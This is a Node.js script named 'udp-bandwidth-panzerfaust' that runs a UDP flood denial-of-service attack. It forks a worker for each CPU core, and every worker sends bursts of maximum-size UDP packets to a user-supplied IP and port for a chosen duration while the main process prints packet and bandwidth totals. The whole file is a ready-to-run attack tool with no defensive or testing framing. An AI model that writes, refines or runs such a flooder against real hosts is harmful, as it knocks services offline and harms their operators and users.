const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-bandwidth-panzerfaust.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const cpuCount = os.cpus().length;
const MAX_UDP_PAYLOAD = 65507;

const payload1 = Buffer.alloc(MAX_UDP_PAYLOAD, 'A');
const payload2 = Buffer.alloc(MAX_UDP_PAYLOAD, 'B');

function formatBytes(bytes) {
  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'ZB'];
  let i = 0;
  while (bytes >= 1024 && i < units.length - 1) {
    bytes /= 1024;
    i++;
  }
  return `${bytes.toFixed(2)} ${units[i]}`;
}

if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytes = 0;
  let maxBps = 0;

  console.clear();
  console.log('UDP-BANDWIDTH-PANZERFAUST [MAX CHAOS BANDWIDTH]');
  console.log('------------------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`CPU Cores: ${cpuCount}\n`);
  console.log('Starting attack...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  const stats = Array(cpuCount).fill({bps: 0, sent: 0, bytes: 0});

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        stats[id - 1] = {bps: msg.bps, sent: msg.sent, bytes: msg.bytes};
      }
    });
  }

  setInterval(() => {
    let intervalSent = 0;
    let intervalBytes = 0;
    let intervalBps = 0;

    for (const stat of stats) {
      intervalSent += stat.sent;
      intervalBytes += stat.bytes;
      intervalBps += stat.bps;
    }

    if (intervalBps > maxBps) maxBps = intervalBps;
    totalSent += intervalSent;
    totalBytes += intervalBytes;

    console.clear();
    console.log('UDP-BANDWIDTH-PANZERFAUST [MAX CHAOS BANDWIDTH]');
    console.log('------------------------------------------------');
    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
    console.log(`Total Bandwidth Sent: ${formatBytes(totalBytes)}`);
    console.log(`Current BPS: ${formatBytes(intervalBps)}/s`);
    console.log(`Max BPS: ${formatBytes(maxBps)}/s`);
    console.log(`Target: ${target}:${port}`);
    console.log('------------------------------------------------\n');
  }, 2000);

  setTimeout(() => {
    console.log('Attack finished. Cleaning up...');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const socket = dgram.createSocket('udp4');
  let sent = 0;
  let bytesSent = 0;
  let bps = 0;

  function flood() {
    if (Date.now() > endTime) return;

    for (let i = 0; i < 2000; i++) { // burst 2000 iterations * 2 packets = 4000 packets per loop
      socket.send(payload1, port, target);
      socket.send(payload2, port, target);
      sent += 2;
      bytesSent += payload1.length + payload2.length;
      bps += payload1.length + payload2.length;
    }

    setImmediate(flood);
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bps, bytes: bytesSent });
    sent = 0;
    bps = 0;
  }, 1000);

  flood();
}
